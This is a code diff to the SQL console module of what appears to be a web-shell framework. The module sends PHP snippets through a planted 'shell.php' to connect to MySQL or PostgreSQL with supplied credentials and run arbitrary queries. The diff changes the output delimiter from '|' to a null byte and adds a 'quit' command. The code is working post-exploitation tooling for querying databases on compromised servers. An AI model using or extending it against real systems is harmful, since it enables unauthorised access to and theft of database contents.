@@ -11,10 +11,10 @@ class Console(Module):
     
     def _set_vectors(self):
 
-        self.support_vectors.add_vector('mysql', 'shell.php', ["""if(mysql_connect("$host","$user","$pass")){$r=mysql_query("$query");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."|";}echo PHP_EOL;}};mysql_close();}""" ])
-        self.support_vectors.add_vector('mysql_fallback', 'shell.php', [ """$r=mysql_query("$query");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."|";}echo PHP_EOL;}};mysql_close();"""]),
-        self.support_vectors.add_vector('pg', 'shell.php', ["""if(pg_connect("host=$host user=$user password=$pass")){$r=pg_query("$query");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."|";}echo PHP_EOL;}};pg_close();}""" ]),
-        self.support_vectors.add_vector('pg_fallback', 'shell.php', ["""$r=pg_query("$query");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."|";} echo PHP_EOL;}};pg_close();"""])
+        self.support_vectors.add_vector('mysql', 'shell.php', ["""if(mysql_connect("$host","$user","$pass")){$r=mysql_query("$query");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};mysql_close();}""" ])
+        self.support_vectors.add_vector('mysql_fallback', 'shell.php', [ """$r=mysql_query("$query");if($r){while($c=mysql_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};mysql_close();"""]),
+        self.support_vectors.add_vector('pg', 'shell.php', ["""if(pg_connect("host=$host user=$user password=$pass")){$r=pg_query("$query");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";}echo "\n";}};pg_close();}""" ]),
+        self.support_vectors.add_vector('pg_fallback', 'shell.php', ["""$r=pg_query("$query");if($r){while($c=pg_fetch_row($r)){foreach($c as $key=>$value){echo $value."\x00";} echo "\n";}};pg_close();"""])
 
     def _set_args(self):
         self.argparser.add_argument('-user', help='SQL username')
@@ -53,6 +53,8 @@ class Console(Module):
                 
                 if not query:
                     continue
+                if query == 'quit':
+                    break
                 
                 self._result = self._query(query)
                 
@@ -77,7 +79,7 @@ class Console(Module):
         result = self.support_vectors.get(self.args['vector']).execute({ 'host' : self.args['host'], 'user' : self.args['user'], 'pass' : self.args['pass'], 'query' : query })
    
         if result:
-            return [ line.split('|') for line in result[:-1].replace('|\n', '\n').split('\n') ]   
+            return [ line.split('\x00') for line in result[:-1].replace('\x00\n', '\n').split('\n') ]   
 
 
     def _check_credentials(self):
